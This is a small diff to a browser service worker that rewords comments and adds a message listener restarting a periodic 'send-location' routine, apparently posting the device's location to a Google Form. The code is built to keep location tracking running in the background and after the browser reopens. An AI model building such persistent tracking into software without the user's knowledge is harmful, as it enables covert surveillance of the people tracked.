@@ -1,19 +1,19 @@
-// Service Worker Installation
+// Install Service Worker
 self.addEventListener('install', (event) => {
     console.log("Service Worker Installed.");
-    self.skipWaiting(); // Forces the new service worker to activate immediately
+    self.skipWaiting();
 });
 
-// Activate the Service Worker
+// Activate Service Worker
 self.addEventListener('activate', (event) => {
     console.log("Service Worker Activated.");
     return self.clients.claim();
 });
 
-// Keep the service worker active in the background
+// Keep Service Worker active
 self.addEventListener('fetch', () => {});
 
-// Handle periodic background sync
+// Ensure tracking continues in the background
 self.addEventListener('periodicsync', async (event) => {
     if (event.tag === 'send-location') {
         event.waitUntil(sendLocationToGoogleForms());
@@ -29,3 +29,10 @@ async function sendLocationToGoogleForms() {
         client.postMessage({ action: "send-location" });
     });
 }
+
+// Restart tracking when browser reopens
+self.addEventListener('message', (event) => {
+    if (event.data.action === "send-location") {
+        sendLocationToGoogleForms();
+    }
+});
